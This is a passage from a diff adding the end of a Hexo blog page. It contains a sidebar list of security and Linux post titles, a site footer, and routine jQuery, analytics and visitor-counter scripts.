class="post-list-item"><a class="post-list-link" href="/2018/06/14/JoomlaSQL注入（CVE-2018-8045）利用/">JoomlaSQL注入（CVE-2018-8045）利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/24/启动数据库/">Metsploit连接数据库</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/24/metsploit获取电脑密码/">Metsploit破解hash</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/python日志/">Python学习日志</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/14/SQL injection/">SQL injection bypass WAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/07/MS15-034漏洞模块利用/">MS15-034漏洞模块利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/05/SQLBypass技巧/">SQL注入Bypass技巧</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/01/游戏旅行青蛙逆向破解/">游戏旅行青蛙逆向破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/27/突破WEB登陆/">突破web系统登录（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/Juice-Shop Windows平台搭建/">Juice-Shop Windows平台搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/02/OWASP Juice Shop v6.4.1部分题目答案（二）/">OWASP Juice Shop v6.4.1部分题目答案（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/31/OWASP Juice Shop v6.4.1部分题目答案/">OWASP Juice Shop v6.4.1部分题目答案</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/CentOS7安装Docker/">CentOS7安装Docker</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/29/python安装pip模块/">Python安装pip模块</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/29/利用SqlMap系统交互shell/">利用SqlMap系统交互shell</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/Centos6.5安装kvm虚拟化/">Centos6.5安装kvm虚拟化</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/28/为各版本linux添加yum源/">为各版本linux添加yum源</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/NTFS 数据隐藏及恢复/">NTFS 数据隐藏及恢复</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/FAT32 数据隐藏及恢复/">FAT32 数据隐藏及恢复</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/27/Centos6.5下 PXE+Kickstart无人值守安装/">Centos6.5下 PXE+Kickstart无人值守安装</a></li></ul>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 Elapse
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 1;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
